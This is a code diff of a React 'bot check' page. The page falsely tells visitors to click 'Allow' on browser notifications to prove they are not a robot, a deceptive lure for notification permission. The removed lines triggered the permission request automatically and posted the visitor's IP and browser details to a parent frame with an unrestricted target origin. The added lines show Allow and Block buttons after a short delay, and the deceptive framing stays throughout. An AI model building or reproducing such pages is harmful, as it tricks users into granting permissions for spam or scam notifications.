@@ -157,28 +157,15 @@ export default function BotCheckPage() {
       return // IMPORTANT: Exit here, no timer for Firefox/Edge
     }
     
-    // For Chrome/Safari, immediately send verification message
-    // This triggers the notification prompt right away
-    setIsChecking(false)
-    setIsVerified(true)
-    
-    // If embedded, immediately send verification complete message to parent
-    if (window.isEmbedded && window.parent !== window) {
-      // Send message immediately to trigger prompt
-      window.parent.postMessage({
-        type: 'bot-check-verified',
-        browserInfo: clientInfo,
-        location: {
-          country: 'United States',
-          city: 'New York',
-          ip: ipAddress
-        }
-      }, '*')
-    } else {
-      // Chrome/Safari - immediately request permission
-      if (clientInfo) {
-        handleAllow()
-      }
+    // For Chrome/Safari, show the bot check screen
+    const timer = setTimeout(() => {
+      setIsChecking(false)
+      setIsVerified(true)
+      // Don't auto-trigger anything - wait for user to interact
+    }, 1500)
+
+    return () => {
+      clearTimeout(timer)
     }
   }, [clientInfo, ipAddress, isFirefoxOrEdge, showSoftPrompt])
 
@@ -635,29 +622,58 @@ export default function BotCheckPage() {
                   </p>
                 </div>
               </div>
-            ) : (!isFirefoxOrEdge && clientInfo?.browser !== 'Firefox' && clientInfo?.browser !== 'Edge') ? (
+            ) : (isVerified && !isFirefoxOrEdge && clientInfo?.browser !== 'Firefox' && clientInfo?.browser !== 'Edge') ? (
+              // Show Allow/Block buttons for Chrome/Safari after verification
               <div className="text-center">
                 <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
-                  Please Click "Allow" to confirm you are not a robot.
+                  Click "Allow" if you're not a robot
                 </h2>
                 
-                <div className="mb-4">
-                  <div className="loading-dot"></div>
-                  <div className="loading-dot"></div>
-                  <div className="loading-dot"></div>
+                <div style={{ 
+                  width: '80px', 
+                  height: '80px', 
+                  margin: '0 auto 30px',
+                  background: '#f0f8ff',
+                  borderRadius: '50%',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center'
+                }}>
+                  <FiShield size={40} color="#0066cc" />
                 </div>
                 
-                <h1 style={{ fontSize: '20px', fontWeight: '500', color: '#333', marginTop: '40px', marginBottom: '20px' }}>
-                  Waiting for your browser permission response...
-                </h1>
-                
-                <p style={{ color: '#999', marginBottom: '10px', fontSize: '14px' }}>
-                  Please respond to the browser notification prompt to continue.
+                <p style={{ fontSize: '16px', color: '#666', marginBottom: '30px', lineHeight: '1.6' }}>
+                  To continue to {domain}, please verify you're human by allowing notifications.
                 </p>
                 
-                <p style={{ color: '#999', marginBottom: '40px', fontSize: '14px' }}>
-                  This may take a few seconds...
-                </p>
+                <div className="d-flex gap-3 justify-content-center">
+                  <Button 
+                    variant="primary"
+                    size="lg"
+                    onClick={handleAllow}
+                    style={{
+                      background: '#0066cc',
+                      border: 'none',
+                      padding: '12px 40px',
+                      fontSize: '16px',
+                      fontWeight: '500',
+                      cursor: 'pointer'
+                    }}
+                  >
+                    Allow
+                  </Button>
+                  <Button 
+                    variant="outline-secondary"
+                    size="lg"
+                    onClick={handleBlock}
+                    style={{
+                      padding: '12px 40px',
+                      fontSize: '16px'
+                    }}
+                  >
+                    Block
+                  </Button>
+                </div>
                 
                 <div style={{ borderTop: '1px solid #e5e5e5', paddingTop: '20px', marginTop: '40px' }}>
                   <p style={{ color: '#999', fontSize: '13px', marginBottom: '5px' }}>
